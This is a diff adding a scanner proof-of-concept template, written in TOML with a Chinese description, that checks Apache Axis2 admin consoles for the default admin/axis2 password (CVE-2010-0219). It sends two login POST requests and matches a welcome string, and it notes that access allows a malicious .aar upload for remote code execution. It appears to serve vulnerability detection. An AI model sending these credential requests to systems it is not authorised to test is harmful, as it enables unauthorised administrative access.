@@ -1,0 +1,55 @@
+[info]
+author = "AVE"
+description = "Apache Axis2 管理控制台 admin 账户存在默认密码 axis2。攻击者可通过默认凭证登录并上传恶意 .aar 文件实现远程代码执行，影响 SAP BusinessObjects Enterprise XI 3.2、CA ARCserve D2D r15 等产品。通过 POST 请求验证默认凭据是否有效。"
+id = "POC-AVE-2010-0002"
+name = "Apache Axis2 默认管理员口令漏洞 PoC"
+severity = "critical"
+tags = [
+    "cve-2010-0219",
+    "axis2",
+    "default-login",
+    "apache",
+]
+vuln_id = [
+    "CVE-2010-0219",
+    "AVE-2010-0002",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/axis2-admin/login"
+protocol = "http"
+
+[poc.requests.body]
+content = "loginUsername=admin&loginPassword=axis2"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["Welcome to Axis2 Web Admin Module"]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/axis2/axis2-admin/login"
+protocol = "http"
+
+[poc.requests.body]
+content = "userName=admin&password=axis2&submit=+Login+"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["Welcome to Axis2 Web Admin Module"]
